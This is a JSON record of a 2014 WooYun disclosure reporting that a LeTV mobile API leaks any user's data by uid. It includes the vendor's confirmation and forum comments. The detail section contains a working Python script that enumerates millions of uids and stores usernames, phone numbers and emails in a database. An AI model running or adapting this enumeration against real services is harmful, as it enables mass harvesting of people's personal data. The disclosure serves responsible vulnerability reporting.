{"id": 3094, "wybug_id": "wooyun-2014-061919", "wybug_title": "乐视网某接口限制不当可读取任意用户信息(续)", "wybug_corp": "乐视网", "wybug_author": "啊L川", "wybug_date": "2014-05-22 21:24", "wybug_open_date": "2014-07-06 21:24", "wybug_type": "敏感信息泄露", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "用户"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向公众公开  简要描述： http://www.wooyun.org/bugs/wooyun-2014-055595  菜鸟学安全  发现漏洞公开，但是没有修复，不知道厂商是怎么个流程！ 详细说明：  感谢@进化程序猿 遍历uid可以获取乐视网所有的用户数据，通过传参发现，用户id已经超过3500000，至少有3500w用户了吧既然这样  那写个脚本遍历下吧   纯属菜鸟 ，，，，，  厂商要重视呀   （数据已删除）\n#-*- coding: utf-8 -*-#!/usr/bin/python__author__ = 'alchuan'import sysimport jsonimport urllib2import MySQLdbreload(sys)sys.setdefaultencoding('utf-8')def getcontent(uid):    id = bytes(uid)    url = 'http://dynamic.app.m.letv.com/android/dynamic.php?mod=passport&ctl=index&act=getUserByID&uid='+id+'&pcode=010210000&version=5.0'    req = urllib2.Request(url)    response = urllib2.urlopen(req)    respHtml = response.read()    response.close()    return chulijson(respHtml)def chulijson(data):    ddata = json.loads(data)    for a in ddata.keys():        if (a == 'bean'):            dirc = ddata['bean']            #print dirc            if dirc:                if (dirc['username'] != ''):                    sql = \"INSERT INTO `leshi_com` (uid, username, mobile, nickname, email) VALUES ('%s', '%s', '%s', '%s', '%s')\" % (dirc['uid'], dirc['username'], dirc['mobile'], dirc['nickname'], dirc['email'])                    #print sql                    adddata(sql)                else:                    pass            else:                pass        else:            passdef adddata(sql):    db = MySQLdb.connect('localhost', 'root', '', '****')    cursor = db.cursor()    try:        cursor.execute(sql)        db.commit()    except:        db.rollback()    db.close()#getcontent(1102594)for x in range(2, 3000000):    getcontent(x)else:    print \"end\"\n   漏洞证明：  \n\n   修复方案：  \n\n   版权声明：转载请注明来源 啊L川@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2014-05-22 21:51 厂商回复： 感谢挖掘，马上修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-22 22:00 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  给川神跪了    \n     2014-05-22 22:13 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  @小川 川神  这个不是你教得我嚒  不要节操！    \n     2014-05-22 22:30 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  之前没修复？    \n     2014-05-22 22:33 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  @魇 没有修复  app  这下要抓紧时间出新版本啦    \n     2014-05-22 22:35 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @啊L川 卧槽我现在看了..还真没    \n     2014-05-22 22:36 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  @魇 菜鸟学安全  大牛们勿喷呀！    \n     2014-05-22 22:52 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  乐视这个也能提交啊- -    \n     2014-05-22 23:00 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  乐视 响应速度 真快呀 这么快就确认了 顶    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}